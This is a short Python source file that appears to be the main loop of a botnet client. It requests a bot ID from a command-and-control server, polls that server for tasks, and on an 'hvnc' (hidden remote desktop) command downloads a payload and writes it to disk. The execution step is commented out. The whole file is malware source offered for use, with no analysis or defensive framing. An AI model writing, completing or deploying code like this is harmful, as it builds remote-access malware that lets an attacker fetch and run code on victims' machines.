import time

from config import *
from logger import *
from client import *
from validate import *
from payload import *

def main():
    init_logging();

    config = read_config();

    if (not validate_config(config)):
        log("Failed to validate config!")

        exit(1)
    
    if ("botid" not in config):
        log("botid not found, requesting from c2 server...")

        config["botid"] = http_get_botid(config)
        write_config(config)

        log(f"Got new botid: {config["botid"]}!")

    while(1):
        response = http_request_command(config)
        if(validate_response(response)):
            if(response["task_name"] == "hvnc"):
                if(response["task_status"] == "enabled"):
                    log("HVNC start detected!")

                    payload = http_get_payload(response["task_command"])

                    file = write_payload(payload)
                    # run_payload(file) 

                    # http_command_finished(config) - отправка сообщения об успешном завершенни команды

        time.sleep(1)

if __name__ == "__main__":
    main()